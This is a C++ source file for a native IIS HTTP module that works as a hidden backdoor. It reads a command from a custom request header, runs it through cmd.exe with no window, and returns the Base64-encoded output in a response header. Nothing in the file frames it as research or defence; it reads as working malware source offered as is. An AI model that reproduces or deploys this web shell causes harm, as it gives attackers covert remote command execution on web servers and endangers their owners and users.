#include "pch.h"
#include "classes.h"
#include "Base64.h"
#include "defs.h"
#include <vector>

DWORD ExecuteCommand(LPCSTR command, std::vector<BYTE>& outputBuffer) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;
    BOOL success = FALSE;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        OutputDebugString(L"CreatePipe failed");
        return -1;
    }

    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    char cmdCommand[MAX_PATH];
    snprintf(cmdCommand, MAX_PATH, "C:\\Windows\\System32\\cmd.exe /c %s", command);

    if (!CreateProcessA(
        NULL,
        cmdCommand,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)) {
        OutputDebugString(L"CreateProcessA failed");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return -1;
    }

    OutputDebugString(L"CreateProcessA Success");

    CloseHandle(hWritePipe);

    outputBuffer.clear();
    
    const DWORD tempBufferSize = 4096;
    std::vector<BYTE> tempBuffer(tempBufferSize);
    DWORD bytesRead;

    while (true) {
        if (!ReadFile(hReadPipe, tempBuffer.data(), tempBufferSize, &bytesRead, NULL) || bytesRead == 0)
            break;
        outputBuffer.insert(outputBuffer.end(), tempBuffer.begin(), tempBuffer.begin() + bytesRead);
    }

    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0; 
}


REQUEST_NOTIFICATION_STATUS CChildHttpModule::OnSendResponse(IN IHttpContext* pHttpContext, IN ISendResponseProvider* pProviderss)
{
	OutputDebugString(L"OnSendResponse IN");
	IHttpRequest* pHttpRequest = pHttpContext->GetRequest();
	IHttpResponse* pHttpResponse = pHttpContext->GetResponse();

	USHORT uComLen = 0;
	LPCSTR lpCommand = pHttpRequest->GetHeader(HEADER, &uComLen);
	if (lpCommand == NULL || uComLen == 0) {
		OutputDebugString(L"lpCommand == NULL || uComLen == 0");
		return RQ_NOTIFICATION_CONTINUE;
	}

	OutputDebugString(L"Command isn't null");
	
	lpCommand = (LPCSTR)pHttpContext->AllocateRequestMemory(uComLen + 1);
	lpCommand = (LPCSTR)pHttpRequest->GetHeader(HEADER, &uComLen);

    std::vector<BYTE> output;

	if (ExecuteCommand(lpCommand, output) != 0)
	{
		OutputDebugString(L"ExecuteCommand Failed");
        return RQ_NOTIFICATION_CONTINUE;
	}

	OutputDebugString(L"ExecuteCommand success");

    if (output.empty())
    {
        OutputDebugString(L"Buffer Is empty!");
        return RQ_NOTIFICATION_CONTINUE;
    }

    OutputDebugString(L"Buffer is not empty");
    LPCSTR b64Data = EncodeBase64(output.data(), output.size());
    if (b64Data == NULL)
    {
        OutputDebugString(L"Base64 Data Is Null!");
        return RQ_NOTIFICATION_CONTINUE;
    }
    OutputDebugStringA(b64Data);
    pHttpResponse->SetHeader(HEADER, b64Data, strlen(b64Data), false);
    output.clear();
    delete[] b64Data;
	OutputDebugString(L"OnSendResponse OUT");
	return RQ_NOTIFICATION_CONTINUE;
}



HRESULT CHttpModuleFactory::GetHttpModule(CHttpModule** ppModule, IModuleAllocator* pModuleAlloc)
{
	CChildHttpModule* pModule = new CChildHttpModule();
	*ppModule = pModule;
	pModule = NULL;
	return S_OK;
}

void CHttpModuleFactory::Terminate()
{
	if (this != NULL)
	{
		delete this;
	}
}